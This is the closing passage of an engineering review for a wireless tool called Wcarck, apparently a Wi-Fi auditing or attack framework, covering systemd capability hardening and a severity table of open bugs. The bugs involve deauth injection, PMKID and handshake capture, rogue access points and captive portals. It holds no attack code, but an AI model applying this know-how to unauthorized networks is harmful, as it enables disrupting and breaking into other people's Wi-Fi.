Remove `CAP_SYS_ADMIN` from the production `.service` file. Create a dev-only
`wcarck-dev.service.d/override.conf` that adds it for mac80211_hwsim testing:
```ini
[Service]
AmbientCapabilities=CAP_NET_RAW CAP_NET_ADMIN CAP_SYS_ADMIN
```

### 12.2 `NoNewPrivileges=true` + ambient caps — verify child processes inherit

With `NoNewPrivileges=true` + `AmbientCapabilities=CAP_NET_RAW CAP_NET_ADMIN`,
ambient capabilities ARE inherited by child processes (airodump-ng, hostapd, nft).
This is correct Linux behavior. However, `hostapd` checks at startup if it can
open raw sockets — it will succeed because it inherits `CAP_NET_RAW`. Good.

But `dnsmasq` by default tries to drop all capabilities on startup (it has its own
security hardening). On Ubuntu 24.04, `dnsmasq` built with `--with-linux-capset`
will drop inherited ambient caps. Pass `--keep-in-foreground --no-daemon` and check
whether dnsmasq actually binds port 53 after startup (the polling approach from §3.4
also catches this).

### 12.3 `ProtectSystem=strict` + `/etc/wcarck/` — config writes blocked

The service has `ProtectSystem=strict` (makes `/usr`, `/boot`, `/etc` read-only).
If anything in the backend tries to write to `/etc/wcarck/config.toml` (e.g., saving
changed settings), it will fail with `EROFS`. The config is read-only from the service.

**Fix:** All runtime-mutable config goes to `/var/lib/wcarck/settings.json` (which
is in `ReadWritePaths`). `/etc/wcarck/config.toml` is static operator config only.

---

## 13. Summary — Issues by Severity

| # | Issue | Phase | Severity |
|---|---|---|---|
| 3.5 | systemd-resolved port 53 conflict | install.sh | **Blocker** |
| 3.3 | hostapd startup: sleep vs AP-ENABLED poll | Phase 4 | **Blocker** |
| 3.4 | dnsmasq starts before AP interface has IP | Phase 4 | **Blocker** |
| 2.3 | stdout pipe deadlock on long captures | Phase 1 | **Blocker** |
| 2.1 | scapy sniff() blocks event loop | Phase 2 | **Blocker** |
| 7.1 | Radiotap header missing from injection frames | Phase 3 | **Blocker** |
| 8.1 | Android CNA: wrong HTTP response type | Phase 4 | **Blocker** |
| 4.1 | WAL mode not automatically enabled | Phase 1 | High |
| 1.1 | rt2800usb burst drops without throttle | Phase 3 | High |
| 1.2 | RTL8821AU channel set fails without iface down | Phase 1 | High |
| 1.3 | DFS channels block hostapd on wlan_ap | Phase 4 | High |
| 3.1 | hcxdumptool ignores SIGINT, needs SIGTERM | Phase 3 | High |
| 5.1 | EventBus dict mutation during fan-out | Phase 1 | High |
| 6.1 | Global lease lock serializes all adapters | Phase 1 | High |
| 6.2 | Lease orphaning on restart | Phase 1 | High |
| 10.1 | 4-EAPOL validator misses PMKID-only captures | Phase 3 | High |
| 10.3 | Channel hopper vs airodump-ng conflict | Phase 2 | High |
| 7.2 | PMF/802.11w deauth silently fails | Phase 3 | Medium |
| 8.2 | iOS CNA: apple.com not in dnsmasq | Phase 4 | Medium |
| 2.2 | pyroute2 blocking event loop | Phase 1 | Medium |
| 4.2 | Scan write storms kill SQLite | Phase 2 | Medium |
| 5.2 | EventBus ring wraps too fast | Phase 1 | Medium |
| 10.2 | CSV parser crashes on non-UTF-8 SSIDs | Phase 2 | Medium |
| 10.5 | Teardown stack coroutine vs callable confusion | Phase 1 | Medium |
| 9.1 | nftables table/chain naming inconsistency | Phase 4 | Medium |
| 11.1 | Zustand re-render storm on scan updates | Phase 2 | Medium |
| 3.2 | aireplay-ng deauth 0 vs finite count | Phase 3 | Low |
| 7.3 | Wrong reason code for broadcast deauth | Phase 3 | Low |
| 10.4 | Job priority direction undefined | Phase 1 | Low |
| 11.2 | TanStack Table needs virtualization | Phase 2 | Low |
| 11.3 | WS reconnect missing jitter | Phase 1 | Low |
| 11.4 | Crack.tsx route missing | Phase 6 | Low |
| 12.3 | ProtectSystem=strict blocks config writes | Phase 1 | Low |

---

*End of Wcarck Engineering Review*
